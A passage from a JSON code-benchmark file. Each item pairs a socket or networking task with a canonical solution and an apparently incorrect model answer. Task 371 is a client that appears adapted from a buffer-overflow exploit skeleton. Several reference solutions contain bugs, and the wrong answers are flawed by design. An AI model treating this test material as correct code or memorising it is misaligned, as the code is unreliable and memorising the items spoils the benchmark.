00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Prints \"Buffer Sent Successfully!\" upon successful completion\n- Prints \"Check your debugger\" if connection errors occur",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((host, port))\n            data = s.recv(1024)\n            print(\"Received:\", data.decode())\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            s.sendall(message.encode())\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Implement a TCP client in Python that can handle multiple types of HTTP requests concurrently using threading and locking mechanisms to manage shared resources.\n\nFunction Description: The code consists of two main functions that perform HTTP GET requests to a server. `long_request` handles a request with a large response, processing it in chunks with delays, while `time_request` handles a quicker request. A threading lock is used to synchronize access to shared resources between these concurrent requests.\n\nInput:\n- `hostname` (str): The target server's hostname or IP address\n- `port` (int): The target server's port number\n- `headers` (str): Additional HTTP headers to include in the request\n\nOutput:\n- Both functions print status messages ('acquire' and 'release') to indicate lock status\n- No explicit return value, but data is received from the server and processed\n- Network connections are properly closed when complete\n\nMethods:\n- `long_request(hostname, port, headers) -> None`: \n  Performs a long-running HTTP GET request, receiving data in chunks with delays between receives. Releases a lock after initial processing and continues receiving more data.\n\n- `time_request(hostname, port, headers) -> None`: \n  Performs a quicker HTTP GET request, acquires a lock before execution, receives all data at once, and closes the connection.\n\nShared Resource:\n- `lock` (threading.Lock): A threading lock used to synchronize access between the two request functions",
    "Canonical_solution": "import sys\nimport socket\nimport time\nimport threading\n\ndef long_request(hostname, port, headers):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /huge HTTP/1.0' + headers)\n    for i in range(1):\n        s.recv(80)\n        time.sleep(0.1)\n    lock.release()\n    print('release')\n    for i in range(10):\n        s.recv(80)\n        time.sleep(0.1)\n    s.close()\n\ndef time_request(hostname, port, headers):\n    lock.acquire()\n    print('acquire')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /tuple HTTP/1.0' + headers)\n    s.recv(900)\n    s.close()\n\nlock = threading.Lock()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import threading\nimport socket\n\nlock = threading.Lock()\n\ndef long_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((hostname, port))\n        sock.sendall(b\"GET / HTTP/1.1\\r\\n\" + headers.encode() + b\"\\r\\n\")\n        print(\"acquire\")\n        lock.acquire()\n        try:\n            data = b\"\"\n            while True:\n                chunk = sock.recv(1024)\n                if not chunk:\n                    break\n                data += chunk\n                # Simulate delay for long request\n                import time\n                time.sleep(0.1)\n            print(\"release\")\n            lock.release()\n            print(f\"Received {len(data)} bytes\")\n        finally:\n            lock.release()\n\ndef time_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((hostname, port))\n        sock.sendall(b\"GET / HTTP/1.1\\r\\n\" + headers.encode() + b\"\\r\\n\")\n        print(\"acquire\")\n        lock.acquire()\n        try:\n            data = sock.recv(1024)\n            print(\"release\")\n            lock.release()\n            print(f\"Received {len(data)} bytes\")\n        finally:\n            lock.release()"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: The task involves creating a Python function that reads log files, extracts specific messages, and sends them to a server using TCP socket communication. The function should parse log entries, identify relevant messages, and transmit them to the appropriate server ports based on the protocol specified in the logs.\n\nFunction Description: The function `send_messages_to_server` processes a log file to extract session IDs, protocols, and hexadecimal messages. It then establishes TCP connections to servers based on the protocols (using ports defined in an XML configuration file) and sends the decoded messages to the respective servers. The function includes a delay between messages to avoid overwhelming the server.\n\nInput: \n- `path` (str): The file path to the log file that contains the messages to be processed and sent. The log file should have entries matching the pattern `YYYY-MM-DD HH:MM:SS  INFO: [SESSION_ID: PROTOCOL < IP_ADDRESS] HEX_MESSAGE`.\n\nOutput: \n- None: The function does not return any value but performs side effects by sending messages to the server and closing the connections.\n\nNote: The function relies on an external XML file (`default.xml`) located in a `../setup/` directory relative to the script's location. This XML file should contain port mappings for different protocols under entries with keys ending in `.port`.",
    "Canonical_solution": "import sys\nimport re\nimport os\nimport xml.etree.ElementTree\nimport socket\nimport binascii\nimport time\n\ndef load_ports():\n    ports = {}\n    dir = os.path.dirname(os.path.abspath(__file__))\n    root = xml.etree.ElementTree.parse(dir + '/../setup/default.xml').getroot()\n    for entry in root.findall('entry'):\n        key = entry.attrib['key']\n        if key.endswith('.port'):\n            ports[key[:-5]] = int(entry.text)\n    return ports\n\ndef send_messages_to_server(path):\n    p = re.compile(r\"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}  INFO: \\[([TU][0-9a-fA-F]{8}): (\\S+) < [\\d.]+] ([0-9a-fA-F]+)\")\n    ports = load_ports()\n    protocols = {}\n    messages = {}\n\n    for line in open(path):\n        m = p.match(line)\n        if m:\n            session = m.group(1)\n            protocol = m.group(2)\n            message = m.group(3)\n            protocols[session] = protocol\n            if session not in messages:\n                messages[session] = []\n            messages[session].append(message)\n\n    for session in protocols:\n        port = ports[protocols[session]]\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((\"localhost\", int(port)))\n        for message in messages[session]:\n            s.send(binascii.unhexlify(message))\n            time.sleep(0.1)\n        s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import xml.etree.ElementTree as ET\nimport socket\nimport time\nimport re\n\ndef send_messages_to_server(path):\n    # Load XML configuration\n    xml_path = '../setup/default.xml'\n    tree = ET.parse(xml_path)\n    root = tree.getroot()\n    \n    # Define port mappings\n    port_map = {}\n    for child in root:\n        if child.tag.endswith('.port'):\n            protocol = child.tag[:-5]\n            port_map[protocol] = int(child.text)\n    \n    # Read log file\n    with open(path, 'r') as file:\n        log_lines = file.readlines()\n    \n    # Process each log line\n    for line in log_lines:\n        # Extract session ID, protocol, IP address, and hex message\n        match = re.match(r'(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}) INFO: \\[SESSION_ID: (\\w+) PROTOCOL (\\w+) < (\\w+)>\\] (.*$)', line)\n        if match:\n            timestamp, session_id, protocol, ip_address, hex_message = match.groups()\n            \n            # Get server port based on protocol\n            port = port_map.get(protocol, 8080)\n            \n            # Create TCP connection\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n                sock.connect((ip_address, port))\n                \n                # Decode hex message\n                decoded_message = bytes.fromhex(hex_message).decode('utf-8')\n                \n                # Send message\n                sock.sendall(decoded_message.encode('utf-8'))\n                \n                # Add delay between messages\n                time.sleep(1)"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Python class that implements a socket-based client for TCP and UDP communication, supporting connection pooling and various socket options. The class should handle both stream (TCP) and datagram (UDP) protocols, with methods for sending/receiving data and managing connections.\n\nClass Description: The `Socket` class provides a flexible interface for socket communication, supporting both IPv4 and Unix domain sockets (if available). It manages connection pooling, socket options, and protocol-specific communication methods.\n\nAttributes:\n\nconnection_pool: [Queue] - A queue for managing socket connections in a pool\ntimeout: [float/None] - Default timeout for socket operations\nconnection: [namedtuple] - Stores connection details (target address, protocol, socket options)\nsend_and_receive: [method] - Protocol-specific method for communication (stream or datagram)\non_unix: [bool] - Flag indicating if Unix domain sockets are available\nprotocols: [dict] - Mapping of protocol names to (address family, socket type) tuples\nstreams: [set] - Set of stream-oriented protocols (TCP, Unix stream)\ndatagrams: [set] - Set of datagram-oriented protocols (UDP, Unix datagram)\ninet: [set] - Set of Internet protocols (TCP, UDP)\nunix: [set] - Set of Unix domain protocols (if available)\n\nMethods:\n\n__init__: [constructor](connect_to: tuple, proto: str, version=None, headers=empty.dict, timeout=None, pool=0, raise_on=(500,), **kwargs) -> None - Initializes the socket client with connection parameters and optional pool size\nsettimeout: [method](timeout: float) -> None - Sets the default timeout for socket operations\nsetsockopt: [method](*sockopts: tuple/list) -> None - Adds socket options to be applied to new connections\n_register_socket: [method]() -> socket.socket - Creates and configures a new socket connection\n_stream_send_and_receive: [method](_socket: socket.socket, message: str, *args, **kwargs) -> BytesIO - Handles stream protocol communication (TCP)\n_dgram_send_and_receive: [method](_socket: socket.socket, message: str, buffer_size=4096, *args) -> BytesIO - Handles datagram protocol communication (UDP)\nrequest: [method](message: str, timeout=False, *args, **kwargs) -> Response - Main method for sending requests and receiving responses, managing connection pool",
    "Canonical_solution": "import socket\nfrom collections import namedtuple\nfrom io import BytesIO\nfrom queue import Queue\n\nResponse = namedtuple(\"Response\", (\"data\", \"status_code\", \"headers\"))\n\nclass Socket:\n    __slots__ = (\"connection_pool\", \"timeout\", \"connection\", \"send_and_receive\")\n\n    on_unix = getattr(socket, \"AF_UNIX\", False)\n    Connection = namedtuple(\"Connection\", (\"connect_to\", \"proto\", \"sockopts\"))\n    protocols = {\n        \"tcp\": (socket.AF_INET, socket.SOCK_STREAM),\n        \"udp\": (socket.AF_INET, socket.SOCK_DGRAM),\n    }\n    streams = set((\"tcp\",))\n    datagrams = set((\"udp\",))\n    inet = set((\"tcp\", \"udp\"))\n    unix = set()\n\n    if on_unix:\n        protocols.update(\n            {\n                \"unix_dgram\": (socket.AF_UNIX, socket.SOCK_DGRAM),\n                \"unix_stream\": (socket.AF_UNIX, socket.SOCK_STREAM),\n            }\n        )\n        streams.add(\"unix_stream\")\n        datagrams.add(\"unix_dgram\")\n        unix.update((\"unix_stream\", \"unix_dgram\"))\n\n    def __init__(\n        self,\n        connect_to,\n        proto,\n        version=None,\n        headers=empty.dict,\n        timeout=None,\n        pool=0,\n        raise_on=(500,),\n        **kwargs\n    ):\n        self.timeout = timeout\n        self.connection = Socket.Connection(connect_to, proto, set())\n        self.connection_pool = Queue(maxsize=pool if pool else 1)\n\n        if proto in Socket.streams:\n            self.send_and_receive = self._stream_send_and_receive\n        else:\n            self.send_and_receive = self._dgram_send_and_receive\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        if type(sockopts[0]) in (list, tuple):\n            for sock_opt in sockopts[0]:\n                level, option, value = sock_opt\n                self.connection.sockopts.add((level, option, value))\n        else:\n            level, option, value = sockopts\n            self.connection.sockopts.add((level, option, value))\n\n    def _register_socket(self):\n        _socket = socket.socket(*Socket.protocols[self.connection.proto])\n        _socket.settimeout(self.timeout)\n\n        if self.connection.sockopts:\n            for sock_opt in self.connection.sockopts:\n                level, option, value = sock_opt\n                _socket.setsockopt(level, option, value)\n\n        _socket.connect(self.connection.connect_to)\n        return _socket\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        data = BytesIO()\n\n        _socket_fd = _socket.makefile(mode=\"rwb\", encoding=\"utf-8\")\n        _socket_fd.write(message.encode(\"utf-8\"))\n        _socket_fd.flush()\n\n        for received in _socket_fd:\n            data.write(received)\n        data.seek(0)\n\n        _socket_fd.close()\n        return data\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        _socket.send(message.encode(\"utf-8\"))\n        data, address = _socket.recvfrom(buffer_size)\n        return BytesIO(data)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if not self.connection_pool.full():\n            self.connection_pool.put(self._register_socket())\n\n        _socket = self.connection_pool.get()\n\n        if timeout or timeout is None:\n            _socket.settimeout(timeout)\n\n        data = self.send_and_receive(_socket, message, *args, **kwargs)\n\n        if self.connection.proto in Socket.streams:\n            _socket.shutdown(socket.SHUT_RDWR)\n\n        return Response(data, None, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nfrom collections import deque, namedtuple\nfrom threading import Lock\n\nConnection = namedtuple('Connection', ['target_address', 'protocol', 'socket_options'])\n\nclass Socket:\n    def __init__(self, connect_to, proto, version=None, headers={}, timeout=None, pool=0, raise_on=(500,), **kwargs):\n        self.connection_pool = deque()\n        self.timeout = timeout\n        self.on_unix = False\n        self.protocols = {\n            'tcp': (socket.AF_INET, socket.SOCK_STREAM),\n            'udp': (socket.AF_INET, socket.SOCK_DGRAM),\n            'unix_stream': (socket.AF_UNIX, socket.SOCK_STREAM),\n            'unix_dgram': (socket.AF_UNIX, socket.SOCK_DGRAM)\n        }\n        self.streams = {'tcp', 'unix_stream'}\n        self.datagrams = {'udp', 'unix_dgram'}\n        self.inet = {'tcp', 'udp'}\n        self.unix = {'unix_stream', 'unix_dgram'}\n        self._initialize_protocol(connect_to, proto, version, headers, timeout, pool, raise_on, **kwargs)\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        for opt in sockopts:\n            if len(opt) == 3:\n                level, optname, value = opt\n                self.socket_options.append((level, optname, value))\n\n    def _register_socket(self):\n        family, socktype = self.protocols[self.protocol]\n        socket_obj = socket.socket(family, socktype)\n        if self.socket_options:\n            for level, optname, value in self.socket_options:\n                socket_obj.setsockopt(level, optname, value)\n        return socket_obj\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        _socket.sendall(message.encode())\n        return BytesIO(_socket.recv(4096))\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        _socket.sendto(message.encode(), self.target_address)\n        data, addr = _socket.recvfrom(buffer_size)\n        return BytesIO(data)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if not self.connection_pool:\n            self._create_connection()\n        connection = self.connection_pool[0]\n        _socket = connection['socket']\n        if timeout:\n            _socket.settimeout(self.timeout)\n        if self.protocol in self.streams:\n            response = self._stream_send_and_receive(_socket, message, *args, **kwargs)\n        else:\n            response = self._dgram_send_and_receive(_socket, message, *args, **kwargs)\n        return response\n\n    def _initialize_protocol(self, connect_to, proto, version=None, headers={}, timeout=None, pool=0, raise_on=(500,), **kwargs):\n        self.protocol = proto\n        self.target_address = connect_to\n        self.socket_options = []\n        self.pool = pool\n        if self.protocol in self.protocols:\n            self._create_connection()\n        else:\n            raise ValueError(f\"Unsupported protocol: {self.protocol}\")"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a function that handles Server-Sent Events (SSE) from an HTTP POST request, processes the incoming data streams, and yields appropriate message objects or raises errors when encountered.\n\nFunction Description: The function `_sse_post` establishes an SSE connection to a specified URL, sends a POST request with provided data and headers, and processes the incoming event stream. It handles different message types by yielding appropriate message objects (ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics) or stream status updates (MessageStreamStatus). It also handles errors, including context window errors and JSON parsing errors, by raising appropriate exceptions.\n\nInput:\n- url: str - The URL to which the POST request will be sent.\n- data: dict - The JSON data to be sent in the POST request body.\n- headers: dict - The headers to be included in the POST request.\n\nOutput:\n- Generator[LettaStreamingResponse, None, None] - A generator that yields objects of type LettaStreamingResponse (which can be ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics, or MessageStreamStatus) as the events are received from the server. Raises LLMError for context window errors or other appropriate exceptions for other errors.",
    "Canonical_solution": "import json\nfrom typing import Generator\nimport httpx\nfrom httpx_sse import SSEError, connect_sse\nfrom letta.constants import OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING\nfrom letta.errors import LLMError\nfrom letta.schemas.enums import MessageStreamStatus\nfrom letta.schemas.letta_message import ReasoningMessage, ToolCallMessage, ToolReturnMessage\nfrom letta.schemas.letta_response import LettaStreamingResponse\nfrom letta.schemas.usage import LettaUsageStatistics\n\ndef _sse_post(url: str, data: dict, headers: dict) -> Generator[LettaStreamingResponse, None, None]:\n    with httpx.Client() as client:\n        with connect_sse(client, method=\"POST\", url=url, json=data, headers=headers) as event_source:\n            if not event_source.response.is_success:\n                response_bytes = event_source.response.read()\n                response_dict = json.loads(response_bytes.decode(\"utf-8\"))\n                error_message = response_dict[\"error\"][\"message\"]\n                if OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING in error_message:\n                    raise LLMError(error_message)\n                event_source.response.raise_for_status()\n\n            try:\n                for sse in event_source.iter_sse():\n                    if sse.data in [status.value for status in MessageStreamStatus]:\n                        yield MessageStreamStatus(sse.data)\n                    else:\n                        chunk_data = json.loads(sse.data)\n                        if \"reasoning\" in chunk_data:\n                            yield ReasoningMessage(**chunk_data)\n                        elif \"tool_call\" in chunk_data:\n                            yield ToolCallMessage(**chunk_data)\n                        elif \"tool_return\" in chunk_data:\n                            yield ToolReturnMessage(**chunk_data)\n                        elif \"step_count\" in chunk_data:\n                            yield LettaUsageStatistics(**chunk_data)\n                        else:\n                            raise ValueError(f\"Unknown message type in chunk_data: {chunk_data}\")\n\n            except SSEError as e:\n                if \"application/json\" in str(e):\n                    response = client.post(url=url, json=data, headers=headers)\n                    if response.headers[\"Content-Type\"].startswith(\"application/json\"):\n                        error_details = response.json()\n                raise e\n\n            except Exception as e:\n                raise e",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "async def _sse_post(url: str, data: dict, headers: dict) -> Generator[LettaStreamingResponse, None, None]:\n    async with aiohttp.ClientSession() as session:\n        async with session.post(url, json=data, headers=headers, ssl=False) as response:\n            if response.status != 200:\n                raise LLMError(f\"Unexpected status code: {response.status}\")\n            \n            async for line in response.content.iter_lines():\n                line = line.decode('utf-8')\n                if not line:\n                    continue\n                \n                if line.startswith('data: '):\n                    event_data = line[len('data: '):].strip()\n                    if not event_data:\n                        continue\n                    \n                    try:\n                        message = json.loads(event_data)\n                        if message.get('type') == 'reasoning':\n                            yield LettaStreamingResponse(message=ReasoningMessage(**message))\n                        elif message.get('type') == 'tool_call':\n                            yield LettaStreamingResponse(message=ToolCallMessage(**message))\n                        elif message.get('type') == 'tool_return':\n                            yield LettaStreamingResponse(message=ToolReturnMessage(**message))\n                        elif message.get('type') == 'usage_statistics':\n                            yield LettaStreamingResponse(message=LettaUsageStatistics(**message))\n                        elif message.get('type') == 'stream_status':\n                            yield LettaStreamingResponse(message=MessageStreamStatus(**message))\n                        else:\n                            raise LLMError(f\"Unknown message type: {message.get('type')}\")\n                    except json.JSONDecodeError:\n                        raise LLMError(\"Failed to parse JSON data from SSE event\")\n                    except Exception as e:\n                        raise LLMError(f\"Error processing SSE event: {str(e)}\")\n                elif line.startswith('event-type:'):\n                    event_type = line[len('event-type: '):].strip()\n                    if event_type == 'context_window_exceeded':\n                        raise LLMError(\"Context window exceeded\")\n                else:\n                    continue"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Implement a TCP server that can handle multiple client connections, process incoming packets, and send replies asynchronously using Python's socket module and Scapy's networking capabilities.\n\nClass Description: AnsweringMachineTCP is a TCP server implementation that listens on a specified port, accepts client connections, and processes incoming packets using Scapy's packet handling capabilities. It supports asynchronous packet sniffing and reply generation for each connected client.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\ncls: [Type[Packet]] - The Scapy packet class used for parsing incoming data\noptsniff: [dict] - Dictionary of additional options for the sniffer configuration\nsniffer: [threading.Thread] - Background thread running the sniffing process\n\nMethods:\n__init__(port=80, cls=conf.raw_layer, **kargs) -> [None] - Initializes the answering machine with specified port, packet class, and additional options\nclose() -> [None] - Closes all resources (placeholder implementation)\nreply(pkt, send_function=None, address=None) -> [None] - Processes incoming packets and sends replies if appropriate\nsniff() -> [None] - Main server loop that accepts connections and starts sniffers for each client\nsniff_bg() -> [None] - Starts the sniffing process in a background thread\nis_request(req) -> [bool] - Determines if a packet should be processed (default always True)\nmake_reply(req, address=None) -> [Packet] - Generates a reply packet (default returns input packet)\nsend_reply(reply, send_function=None) -> [None] - Sends the generated reply to the client",
    "Canonical_solution": "import socket\nfrom typing import Optional, Type, Any\nfrom scapy.arch import get_if_addr\nfrom scapy.config import conf\nfrom scapy.packet import Packet\nfrom scapy.supersocket import StreamSocket\nimport functools\nfrom scapy.sendrecv import AsyncSniffer\n\nclass AnsweringMachineTCP:\n    \"\"\"\n    An answering machine that use the classic socket.socket to\n    answer multiple TCP clients\n    \"\"\"\n    TYPE = socket.SOCK_STREAM\n\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if not self.is_request(pkt):\n            return\n        if address:\n            reply = self.make_reply(pkt, address=address)\n        else:\n            reply = self.make_reply(pkt)\n        if not reply:\n            return\n        if send_function:\n            self.send_reply(reply, send_function=send_function)\n        else:\n            self.send_reply(reply)\n\n    def sniff(self):\n        ssock = socket.socket(socket.AF_INET, self.TYPE)\n        try:\n            ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        except OSError:\n            pass\n        ssock.bind(\n            (get_if_addr(self.optsniff.get(\"iface\", conf.iface)), self.port))\n        ssock.listen()\n        sniffers = []\n        try:\n            while True:\n                clientsocket, address = ssock.accept()\n                sock = StreamSocket(clientsocket, self.cls)\n                optsniff = self.optsniff.copy()\n                optsniff[\"prn\"] = functools.partial(self.reply,\n                                                    send_function=sock.send,\n                                                    address=address)\n                del optsniff[\"iface\"]\n                sniffer = AsyncSniffer(opened_socket=sock, **optsniff)\n                sniffer.start()\n                sniffers.append((sniffer, sock))\n        finally:\n            for (sniffer, sock) in sniffers:\n                try:\n                    sniffer.stop()\n                except Exception:\n                    pass\n                sock.close()\n            self.close()\n            ssock.close()\n\n    def sniff_bg(self):\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return 1\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nfrom threading import Thread\nfrom scapy.all import sniff, Ether, IP, TCP, send\nfrom scapy.layers.l2 import Ether\nfrom scapy.layers.inet import IP, TCP\nimport time\n\nclass AnsweringMachineTCP:\n    def __init__(self, port=80, cls=Ether, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n        self.sniffer = None\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind(('localhost', self.port))\n        self.server_socket.listen(5)\n        self.sniff_bg()\n\n    def close(self):\n        self.server_socket.close()\n\n    def reply(self, pkt, send_function=None, address=None):\n        if self.is_request(pkt):\n            reply = self.make_reply(pkt, address)\n            if send_function:\n                send_function(reply)\n            else:\n                send(reply)\n\n    def sniff(self):\n        while True:\n            client_socket, client_address = self.server_socket.accept()\n            print(f\"Connection from {client_address}\")\n            self.sniff_bg()\n\n    def sniff_bg(self):\n        self.sniffer = Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return True\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)\n        else:\n            send(reply)"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Implement a TCP server for handling Tuya smart device communication, including session key negotiation and device state query responses.\n\nFunction Description: The function establishes a TCP server that listens for incoming Tuya device connections, handles secure session key negotiation, and responds to device state queries. It maintains communication security through HMAC verification and AES encryption.\n\nInput:\n- None (uses module-level constants: bind_host, bind_port, real_key)\n\nOutput:\n- None (continuously runs as a server, maintains active connections and handles client communication)\n\nKey Operations:\n1. Creates an IPv6 TCP socket with SO_REUSEADDR option\n2. Binds to specified host/port and listens for connections\n3. Uses select() for non-blocking I/O multiplexing\n4. Handles three message types:\n   - SESS_KEY_NEG_START: Initiates secure session negotiation\n   - SESS_KEY_NEG_FINISH: Completes session key exchange\n   - DP_QUERY_NEW: Responds to device state queries with mock data\n5. Maintains sequence numbers and temporary keys for each session\n6. Automatically closes stale connections\n\nSecurity Features:\n- HMAC-SHA256 for message authentication\n- AES encryption for session keys\n- Nonce-based key exchange protocol\n\nError Handling:\n- Automatically recovers from client disconnections\n- Handles malformed messages with error responses\n- Maintains connection state between messages",
    "Canonical_solution": "import socket\nimport select\nimport time\nimport json\nfrom hashlib import sha256\nimport hmac\nimport tinytuya\n\nbind_host = ''\nbind_port = 6668\nreal_key = b'thisisarealkey00'\n\ndef handle_tuya_communication():\n    srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    srv.bind((bind_host, bind_port))\n    srv.listen(1)\n\n    client = None\n    tmp_key = real_key\n    seqno = 1\n    local_nonce = str(time.time() * 1000000)[:16].encode('utf8')\n\n    while True:\n        r = [srv]\n        if client:\n            r.append(client)\n        w = []\n        x = []\n\n        r, w, x = select.select(r, w, x, 1)\n\n        for sock in r:\n            if sock is srv:\n                if client:\n                    client.close()\n                    client = None\n                client, addr = sock.accept()\n                client.setblocking(False)\n                tmp_key = real_key\n                seqno = 1\n                continue\n\n            if sock is not client:\n                continue\n\n            data = sock.recv(4096)\n            if not data:\n                client.close()\n                client = None\n                continue\n\n            m = tinytuya.unpack_message(data, hmac_key=tmp_key, no_retcode=True)\n\n            if m.cmd == tinytuya.SESS_KEY_NEG_START:\n                tmp_key = real_key\n                payload = m.payload\n                remote_nonce = payload\n                miv = remote_nonce[:12]\n                hmac_check = hmac.new(real_key, remote_nonce, sha256).digest()\n                msg = tinytuya.TuyaMessage(seqno, tinytuya.SESS_KEY_NEG_RESP, 0, local_nonce+hmac_check, 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            elif m.cmd == tinytuya.SESS_KEY_NEG_FINISH:\n                rkey_hmac = hmac.new(real_key, local_nonce, sha256).digest()\n                tmp_key = bytes([a^b for (a,b) in zip(remote_nonce,local_nonce)])\n                cipher = tinytuya.AESCipher(real_key)\n                tmp_key = cipher.encrypt(tmp_key, use_base64=False, pad=False, iv=miv)[12:28]\n            elif m.cmd == tinytuya.DP_QUERY_NEW:\n                resp = {'protocol': 4, 't': int(time.time()), 'data': {'dps': {'20': True, '21': 'white', '22': 946, '23': 3, '24': '014a03e803a9', '25': '04464602007803e803e800000000464602007803e8000a00000000', '26': 0, '34': False}}}\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, json.dumps(resp).encode('ascii'), 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            else:\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, b'json obj data unvalid', 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport select\nimport hmac\nimport hashlib\nimport binascii\nimport struct\nimport threading\nimport os\nimport time\n\nbind_host = '::1'\nbind_port = 50000\nreal_key = b'your_real_key_here'\n\nclass TuyaServer:\n    def __init__(self):\n        self.sockets = []\n        self.clients = {}\n        self.sequence_numbers = {}\n        self.temp_keys = {}\n        self.last_heartbeat = {}\n        self.heartbeats = {}\n\n    def create_socket(self):\n        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setblocking(0)\n        return sock\n\n    def handle_client(self, sock, addr):\n        client_id = f\"{addr[0]}:{addr[1]}\"\n        self.clients[client_id] = {\n            'sock': sock,\n            'addr': addr,\n            'seq_num': 0,\n            'temp_key': None,\n            'state': 'new',\n            'last_msg_time': time.time()\n        }\n        self.sockets.append(sock)\n        self.last_heartbeat[client_id] = time.time()\n\n        try:\n            while True:\n                readable, _, _ = select.select(self.sockets, [], [])\n                for s in readable:\n                    if s == sock:\n                        data = s.recv(4096)\n                        if not data:\n                            self.close_client(client_id)\n                            break\n                        try:\n                            self.process_message(data, client_id)\n                        except Exception as e:\n                            print(f\"Error processing message: {e}\")\n                            self.close_client(client_id)\n        except Exception as e:\n            print(f\"Client error: {e}\")\n        finally:\n            self.close_client(client_id)\n\n    def close_client(self, client_id):\n        if client_id in self.clients:\n            del self.clients[client_id]\n            if client_id in 